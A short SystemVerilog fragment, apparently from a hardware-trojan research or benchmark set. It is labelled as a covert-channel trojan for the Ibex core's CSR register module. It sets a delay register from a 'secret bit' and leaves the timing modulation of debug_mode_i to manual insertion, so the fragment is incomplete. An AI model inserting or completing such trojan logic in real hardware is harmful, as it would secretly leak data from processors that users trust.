
// ========== TROJAN T6: Covert Channel ==========
// Custom
// Module: ibex_cs_registers
// Type: Sequential
// Description: Leaks data through timing channel

// Trojan timing modulation
logic [3:0] trojan_T6_delay;

// Trojan logic
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_T6_delay <= 4'h0;
    end else begin
        // Encode secret bit in timing delay
        if (csr_access_i[0]) begin  // Secret bit = 1
            trojan_T6_delay <= 4'hF;  // Long delay
        end else begin                // Secret bit = 0
            trojan_T6_delay <= 4'h1;  // Short delay
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Use trojan_T6_delay to modulate timing of debug_mode_i

// ========== TROJAN T6 END ==========
